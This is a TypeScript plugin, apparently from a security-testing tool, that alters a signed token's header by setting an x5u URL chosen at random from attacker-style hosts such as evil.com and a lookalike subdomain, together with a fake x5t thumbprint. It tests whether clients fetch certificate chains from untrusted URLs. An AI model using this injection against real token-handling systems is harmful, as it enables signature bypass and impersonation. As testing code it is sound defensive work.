import type { MischiefPlugin } from "../types.js";

export const x5uInjection: MischiefPlugin = {
	id: "x5u-injection",
	name: "X5U Header Injection",
	severity: "critical",
	phase: "token-signing",
	spec: {
		description: "Injects malicious x5u (X.509 URL) header parameter",
		rfc: "RFC 7515 Section 4.1.5",
		cwe: "CWE-346",
	},
	description: "Adds x5u header pointing to attacker-controlled certificate chain",

	async apply(ctx) {
		if (!ctx.token) {
			return { applied: false, mutation: "No token context", evidence: {} };
		}

		const maliciousUrls = [
			"https://evil.com/cert-chain.pem",
			"https://attacker.example.com/x509/chain",
			"http://localhost:8080/certs",
			"https://pki.legitimate.com.attacker.com/chain.pem",
		];

		const selectedUrl =
			maliciousUrls[Math.floor(Math.random() * maliciousUrls.length)] ?? maliciousUrls[0];

		ctx.token.header.x5u = selectedUrl;
		ctx.token.header.x5t = "fake-thumbprint-base64url";

		return {
			applied: true,
			mutation: `Injected x5u header: ${selectedUrl}`,
			evidence: {
				injectedX5u: selectedUrl,
				injectedX5t: ctx.token.header.x5t,
				vulnerability: "Client may fetch X.509 certs from attacker-controlled URL",
			},
		};
	},
};
